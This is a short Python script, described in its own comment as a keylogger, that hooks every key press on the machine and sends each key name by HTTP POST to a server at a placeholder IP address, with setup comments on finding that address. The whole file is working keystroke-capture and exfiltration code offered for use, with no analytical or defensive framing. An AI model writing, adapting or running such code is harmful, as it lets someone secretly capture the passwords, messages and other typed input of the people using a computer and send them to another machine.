'''
This is the main keylogger scrip that sends key strokes to server running on another machine
'''

import keyboard

import requests

url = 'http://<ip-address>:5000/data' # use your server’s IP, e.g. http://192.168.0.98:5000/data
# this ip address must be same the server ip address check from your machine's cmd by running 'ipconfig /all' command

print("Keylogger started. Press ESC to stop.")

# This function will be called whenever a key is pressed
def on_key_press(event):
    #print(event.name)
    payload = {'message':event.name}
    response = requests.post(url,json=payload)
    print("Server respond",response.text)

# Hook all key presses
keyboard.on_press(on_key_press)

# Block the program until ESC is pressed
keyboard.wait('esc')
